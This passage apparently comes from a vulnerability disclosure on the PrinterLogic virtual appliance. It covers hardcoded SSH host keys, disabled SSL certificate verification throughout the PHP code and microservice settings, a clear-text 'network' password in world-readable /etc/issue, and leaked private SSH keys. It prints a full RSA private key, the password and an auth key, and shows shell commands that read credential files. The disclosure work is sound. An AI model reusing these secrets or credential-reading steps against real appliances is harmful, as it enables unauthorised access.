QwAAAAtzc2gtZWQyNTUxOQAAACDl9z93z/gIS+6k/vmGS2Cp/tU8MRN8ual0SAL3s4XQcQ
AAAEC1L9xfXxOtAtTJbJv8JygidLOmF3lRX6iuYiUCL18SsuX3P3fP+AhL7qT++YZLYKn+
1TwxE3y5qXRIAvezhdBxAAAAEXJvb3RAcHJpbnRlcmxvZ2ljAQIDBA==
-----END OPENSSH PRIVATE KEY-----
root@printerlogic:/etc/ssh# sha256sum *
9fa9dd312da04fbad130b70c96bf9707b8dc72cbdbb304d69bf58f52f94883b4  moduli
a39fbc57dc2ef8a473f078d1f6a35f725809400df67070b8852e8ed725047df2  ssh_config
750055f1d4ccc3517430e442faa8e19a47f611e53127de4a68c92e898761896b  sshd_config
7544d4035f03765866a1e8f03ff5bc713ecc794c675ce87a925d5a9ff0918905  ssh_host_ecdsa_key
f368c137cdbc3fcc9e573b35510896154a890720e6f9e13087de5c2ac4b10c4e  ssh_host_ecdsa_key.pub
f8d2a063872a82042bb1ec7ed2bb6e77b4bf10d47812461b50c72fbf12093146  ssh_host_ed25519_key
4f3ffad2e07fd9528260bdf58b3d83489d46a94241aa5a728298b7eed0520737  ssh_host_ed25519_key.pub
cca460094f777dfc1be24045b2f6e0b5cb5fed62bf0760f4f20f14a56377074b  ssh_host_rsa_key
fa6050b0f6fe07a3154c9eed9be1242291a02158117a14c09c1d7808aba0888a  ssh_host_rsa_key.pub
70f138f006507c07ced8cfe940ea2e8d2137246f5a270f535b0d7e64d070069b  ssh_import_id
</code></pre>
<p>Any attacker can decrypt the SSH traffic to the appliance.</p>
<p><a id="va-insecure-communications"></a></p>
<h2>Details - Insecure communications to printers and insecure communications to micro-services by disabling all SSL verifications</h2>
<p>When auditing the PHP code, it appears communications to printers are insecure.</p>
<p>By default, there is no verification of SSL certificates, as <code>CURLOPT_SSL_VERIFYHOST</code> and <code>CURLOPT_SSL_VERIFYPEER</code> are set to <code>false</code> in a large part of the code base.</p>
<p>This means that the solution expressively uses insecure connection to printers, allowing Man-In-The-Middle attacks and disabling any communication security.</p>
<p>From the curl documentation:</p>
<ul>
<li><a href="https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYHOST.html">https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYHOST.html</a></li>
</ul>
<blockquote>
<p>When the verify value is 0, the connection succeeds regardless of the names in the certificate. Use that ability with caution!</p>
</blockquote>
<ul>
<li><a href="https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html">https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html</a></li>
</ul>
<blockquote>
<p>WARNING: disabling verification of the certificate allows bad guys to man-in-the-middle the communication without you knowing it. Disabling verification makes the communication insecure. Just having encryption on a transfer is not enough as you cannot be sure that you are communicating with the correct end-point.</p>
</blockquote>
<p>Extraction of curl options from PHP code.</p>
<p>Curl options set to insecure values:</p>
<pre><code>root@printerlogic:/var/lib/docker/overlay2/b824f2e313d90952d397bc61401bff229c6feea92597b8d37758b959b08d2ffa/merged/var/www# rgrep CURLOPT_SSL_VERIFYHOST .
./app/console_release/samsung/samsung_rest_helper.php:  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch_check, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/fast_release/elatec_tcpconv2.php:            curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/km/konicaminolta_soap_helper.php:         //curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); 
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
./app/console_release/common/cpa_helper_functions.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/console_release/hp/hp_soap_helper.php:            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/console_release/xerox/removeApp.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/xerox/xerox_auth_soap_server_0.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/xerox/xerox_auth_soap_server_0.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/console_release/xerox/installApp.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/lib/common/aws/lib/requestcore/requestcore.class.php:             curl_setopt($curl_handle, CURLOPT_SSL_VERIFYHOST, true);
./app/app/Helpers/HPSoapHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);                         
./app/app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./app/app/Console/Commands/XeroxSoapClient.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./vendor/guzzlehttp/guzzle/src/Handler/CurlFactory.php:                $conf[CURLOPT_SSL_VERIFYHOST] = 0;
./vendor/guzzlehttp/guzzle/src/Handler/CurlFactory.php:                $conf[CURLOPT_SSL_VERIFYHOST] = 2; 
./vendor/guzzlehttp/guzzle/CHANGELOG.md:* Bug: CURLOPT_SSL_VERIFYHOST is now correctly set to false when setting `$certificateAuthority` to false in
./vendor/guzzlehttp/guzzle/CHANGELOG.md:* CURLOPT_SSL_VERIFYHOST is never set to 1 because it is deprecated (see 5e0ff2ef20f839e19d1eeb298f90ba3598784444)
./vendor/sensiolabs/security-checker/SensioLabs/Security/Crawler/CurlCrawler.php:        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);

root@printerlogic:/var/lib/docker/overlay2/b824f2e313d90952d397bc61401bff229c6feea92597b8d37758b959b08d2ffa/merged/var/www# rgrep CURLOPT_SSL_VERIFYPEER .
./app/console_release/samsung/samsung_rest_helper.php:  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch_check, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/fast_release/elatec_tcpconv2.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/fast_release/elatec_tcpconv2.php:            curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/km/konicaminolta_soap_helper.php:         //curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 1);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/km/konicaminolta_soap_helper.php:         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/common/cpa_helper_functions.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/console_release/hp/hp_soap_helper.php:            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/xerox/xerox_soap_helper.php:    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/console_release/xerox/removeApp.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/xerox/xerox_auth_soap_server_0.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/xerox/xerox_auth_soap_server_0.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/console_release/xerox/installApp.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/lib/common/lightopenid/openid.php:        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
./app/lib/common/aws/lib/requestcore/requestcore.class.php:             curl_setopt($curl_handle, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Helpers/HPSoapHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Helpers/ToshibaSoapHelpers.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
./app/app/Helpers/XeroxSOAPHelper.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./app/app/Console/Commands/XeroxSoapClient.php:        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./vendor/guzzlehttp/guzzle/src/Handler/CurlFactory.php:                $conf[CURLOPT_SSL_VERIFYPEER] = false;
./vendor/guzzlehttp/guzzle/src/Handler/CurlFactory.php:                $conf[CURLOPT_SSL_VERIFYPEER] = true;
./vendor/sensiolabs/security-checker/SensioLabs/Security/Crawler/CurlCrawler.php:        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 1);
root@printerlogic:/var/lib/docker/overlay2/b824f2e313d90952d397bc61401bff229c6feea92597b8d37758b959b08d2ffa/merged/var/www#
</code></pre>
<p>A large part of these options are set to false, disabling the security of communications.</p>
<p>The lack of checking validity of SSL certificates seems to be a regular pattern. The variables used for SSL verification are also set to false for micro-services.</p>
<p>Variables used to be sure no verification of SSL certificates is done in Docker images:</p>
<pre><code>kali$ cat ./out-images/10daa560935d018324043b3ae4110cc94d91e24ab756da94634f6106b2f69ec6/var/www/app/.env
...
API_GATEWAY_URL=https://pi
API_GATEWAY_PUBLIC_URL=https://pi.pl-local.com
API_GATEWAY_VERIFYSSL=false

# PrinterInstaller API
API_PRINTERINSTALLER_URL=https://pi
API_PRINTERINSTALLER_VERIFYSSL=false

# Microservice Authorization Key
MS_AUTH_KEY=1001-LOCAL-ENV-KEY-1001

# User Microservice API
API_USER_URL=https://users
API_USER_VERIFYSSL=false

# Platform API
API_PLAT_API_URL=http://plat-api
API_PLAT_API_VERIFYSSL=false

# Quota Management Microservice API
API_QUOTA_URL=https://qm
API_QUOTA_VERIFYSSL=false

# Printer Queue Microservice API
API_PQ_URL=https://pq
API_PQ_VERIFYSSL=false

# Driver Catalog Microservice API
API_DRIVER_CATALOG_URL=https://drivers
API_DRIVER_CATALOG_VERIFYSSL=false

# Okta Microservice API
API_OKTA_URL=https://okta
API_OKTA_VERIFYSSL=false

# Authn Microservice API
API_AUTHN_URL=http://authn
API_AUTHN_VERIFYSSL=false

# External Badge Controller Microservice API
EBC_URL=http://ebc
EBC_VERIFYSSL=false

# Cpp-Ui Microservice API
API_CPP_UI_URL=https://cpp-ui
API_CPP_UI_VERIFYSSL=false
API_CPP_UI_PUBLIC_URL=https://cpp-ui.pl-local.com:12443

# New API Gateway Microservice
API_GW_URL=http://gw
API_GW_PUBLIC_URL=https://gw.pl-local.com:5443
API_GW_VERIFYSSL=false

# Badge Reader Microservice API
API_BR_URL=https://br
API_BR_VERIFYSSL=false

# VA-API Microservice
VA_API_URL=http://va-api
VA_API_VERIFYSSL=false

# SCSS Microservice API
API_SCSS_URL=http://scss
API_SCSS_VERIFYSSL=false

# Identity Microservice API
API_IDENTITY_URL=http://identity
API_IDENTITY_VERIFYSSL=false

# Catalog Microservice API
API_CAT_URL=http://cat
API_CAT_VERIFYSSL=false

# Qms Microservice API
API_QMS_URL=http://qms
API_QMS_VERIFYSSL=false
</code></pre>
<p>Variables used to be sure no verification of SSL certificates is done</p>
<pre><code>kali$ cat ./out-images/f9380ebd8863a503cfb6f1864cfd46dc28611d1e35c7569fc26eb07700c41f63/opt/pc-sys/env/base/app.env
[...]
# SSL verification
API_AUTHN_VERIFYSSL=${API_AUTHN_VERIFYSSL:-false}
API_BR_VERIFYSSL=${API_BR_VERIFYSSL:-false}
API_CAT_VERIFYSSL=${API_CAT_VERIFYSSL:-false}
API_CPP_UI_VERIFYSSL=${API_CPP_UI_VERIFYSSL:-false}
API_GATEWAY_VERIFYSSL=${API_GATEWAY_VERIFYSSL:-false}
API_PRINTERINSTALLER_VERIFYSSL=${API_PRINTERINSTALLER_VERIFYSSL:-false}
API_USER_VERIFYSSL=${API_USER_VERIFYSSL:-false}
[...]
</code></pre>
<p>When looking for <code>ssl</code> and <code>false</code>, more results will appear in PHP source code.</p>
<p>Variables used to be sure no verification of SSL certificates is done:</p>
<pre><code>./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
./www/app/app/Services/IdentityService.php:                    RequestOptions::VERIFY =&gt; boolval(config('api.identity.verify_ssl', false)),
[...]
./www/app/config-laravel/api.php:        'verify_ssl' =&gt; env('API_IDENTITY_VERIFYSSL', false),
./www/app/config-laravel/api.php:        'verify_ssl' =&gt; env('API_CAT_VERIFYSSL', false),
[...]
</code></pre>
<p>By design, the solution is vulnerable to Man-In-The-Middle attacks and does not provide security when communicating with the printers (e.g. releasing jobs). The <code>Secure Printing</code> is insecure by default.</p>
<p>The micro-apis do not check SSL certificates. In any case, these communications are done over clear-text HTTP.</p>
<p><a id="va-clear-text-password"></a></p>
<h2>Details - Password for <code>network</code> stored in clear-text inside <code>/etc/issue</code>, world-readable</h2>
<p>By default, it is possible to retrieve the password of the <code>network</code> user.</p>
<p>The file <code>/etc/issue</code> contains the password in clear-text. Furthermore, this file is world-readable:</p>
<pre><code>root@printerlogic:/etc# ls -la /etc/issue
-rw-r--r-- 1 root root 406 Jan 21 12:25 /etc/issue
root@printerlogic:/etc# cat /etc/issue
   . . . . . . . . . . . . . . . . . . . . . . . . . . . . 
 .
 .  PrinterLogic Virtual Appliance Host Version: 1.0.730
 .
 .  STATUS: running
 .      IP: \4
 .
 .  Your application is running and may be accessed at: 
 .    http://10.105.0.240/admin
 .
 .  To change network settings please login:
 .    User: network
 .    password: gl3wW5pwQW
 .
   . . . . . . . . . . . . . . . . . . . . . . . . . . . .

root@printerlogic:/etc#
</code></pre>
<p>An attacker with a shell on the appliance can use the <code>network</code> account to change network parameters.</p>
<p><a id="va-hardocoded-private-ssh-keys"></a></p>
<h2>Details - Hardcoded SSH keys + private SSH keys for [redacted]@printerlogic.com</h2>
<p>4 private SSH keys have been identified inside overlay file systems.</p>
<p>Private SSH key for [redacted]@printerlogic.com:</p>
<pre><code>root@printerlogic:/var/lib/docker/overlay2# cat l/52OZV2SUNBKDGHGOMZIF7THOG4/var/www/app/.docker-config/buildkey/key
-----BEGIN RSA PRIVATE KEY-----
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
-----END RSA PRIVATE KEY-----
root@printerlogic:/var/lib/docker/overlay2# cat l/52OZV2SUNBKDGHGOMZIF7THOG4/var/www/app/.docker-config/buildkey/key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNyc+v6JH6q5M47st8Cs3a7ekwr7TW4j6GCkXupqnDhdcIRXkb9pXyF+0dfPk3X3DrZ1yYSjx9z848POhmecIA9OGAMBqewAQllS5GrkdTH7mAZ1ECTvrjzkZnHAEz95ED2TlI20n4xY06yXZbLIQhM9DjhTlNDP0Vz51spn/xKRyN2hk/MC3TqVRiePkxPhp54OanuxQj74Xes905vFCIXukqKslRKXuZMiPPBr+rXma99Ev09APkJGu+Gf12d4c+7A+iOCDjphQ7IgzMS5qegKVFynX1UPoTUClUZN/oBVOitu3EVAajY7BOOGE4K+EAtxRjiwYfNAb2tajXMcDV8BcKiPu1mR23Q+sr39GOZgfuEcIQt7NvqMnBtNRomOBT7L4JJJ83G7kqP7BtDPS7OTjxNthPQNIMIgPC+rt9RCR/LlUCRSXNVi11el/L1zntHUfNNhsR+s94qjiS9PeXOqqDplpAEW7qIA6OW27cMJHaSHT0TbhZMyMj5qTTf4fUGkfKg5S5+yOUc8Y+ZVLD/62Tmc4EVFMKExB6AY8sormW4KnStBOH//4N0+RobSinClH7pAs8t91H9EZMOb1HWLuh9sC6O6I8Y/7VNjpMRMwPjTVxyWioPfvXL/nYAarQx2T8vHJ0PPhPw9rv7HFg28j7SmwQUJJArOIx1N0d+w== [redacted]@printerlogic.com
root@printerlogic:/var/lib/docker/overlay2#
</code></pre>
<p>It is possible to extract all these private keys:</p>
<pre><code>kali% ls -la 
total 44
drwxr-xr-x 2 user user 4096 Jan 27 05:20 .
drwxr-xr-x 7 user user 4096 Jan 27 06:54 ..
-rw-r--r-- 1 user user  757 Jan 27 05:20 0c6cde480b4d75d9c9a82b8a12c6d445895bb825e9af124a45a30ebad50bda2f
-rw-r--r-- 1 user user 3298 Jan 27 05:20 2410f7c3221fd364bbd3973e9a9d4a5822470220de3fc62b3f03c805b3c0d18a
-rw-r--r-- 1 user user  554 Jan 27 05:20 4ea7f52240de54a12d5e69ca3e466ae1b0104237f170a52e464571d5ba31fa30
-rw-r--r-- 1 user user 3247 Jan 27 05:20 788a46c826899b5e540230665f70b01d6109e3dfd3fff563c2dde28a8d5d9cab
-rwxr-xr-x 1 user user  756 Jan 27 05:20 83159c9f12a524d61211d7d1c90be6f0adc28af47f005642984a38535635ba98
-rw-r--r-- 1 user user  758 Jan 27 05:20 ad8dd47e588d13a71445fc4094cf235134345c75078717a65edd99570ea09b86
-rw-r--r-- 1 user user 2578 Jan 27 05:20 ba6d3cc939560607ddb022268532711ebe04a4d3a9091b8e8c021fe18d3e54ad
-rwxr-xr-x 1 user user 3246 Jan 27 05:20 e4eef378452637b12bdf3be4b094dbf31815aa135eac4bd32f705cd74e890909
-rw-r--r-- 1 user user 3252 Jan 27 05:20 f8b7e55b72b82e3dcfc3801441522e87cf9b3a9c8bc10e66ad7ba421ee5cac9c
kali% for i in 0c6cde480b4d75d9c9a82b8a12c6d445895bb825e9af124a45a30ebad50bda2f  4ea7f52240de54a12d5e69ca3e466ae1b0104237f170a52e464571d5ba31fa30  83159c9f12a524d61211d7d1c90be6f0adc28af47f005642984a38535635ba98  ad8dd47e588d13a71445fc4094cf235134345c75078717a65edd99570ea09b86; do cat $i;echo;done
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDNyc+v6JH6q5M47st8Cs3a7ekwr7TW4j6GCkXupqnDhdcIRXkb9pXyF+0dfPk3X3DrZ1yYSjx9z848POhmecIA9OGAMBqewAQllS5GrkdTH7mAZ1ECTvrjzkZnHAEz95ED2TlI20n4xY06yXZbLIQhM9DjhTlNDP0Vz51spn/xKRyN2hk/MC3TqVRiePkxPhp54OanuxQj74Xes905vFCIXukqKslRKXuZMiPPBr+rXma99Ev09APkJGu+Gf12d4c+7A+iOCDjphQ7IgzMS5qegKVFynX1UPoTUClUZN/oBVOitu3EVAajY7BOOGE4K+EAtxRjiwYfNAb2tajXMcDV8BcKiPu1mR23Q+sr39GOZgfuEcIQt7NvqMnBtNRomOBT7L4JJJ83G7kqP7BtDPS7OTjxNthPQNIMIgPC+rt9RCR/LlUCRSXNVi11el/L1zntHUfNNhsR+s94qjiS9PeXOqqDplpAEW7qIA6OW27cMJHaSHT0TbhZMyMj5qTTf4fUGkfKg5S5+yOUc8Y+ZVLD/62Tmc4EVFMKExB6AY8sormW4KnStBOH//4N0+RobSinClH7pAs8t91H9EZMOb1HWLuh9sC6O6I8Y/7VNjpMRMwPjTVxyWioPfvXL/nYAarQx2T8vHJ0PPhPw9rv7HFg28j7SmwQUJJArOIx1N0d+w== [redacted]@printerlogic.com
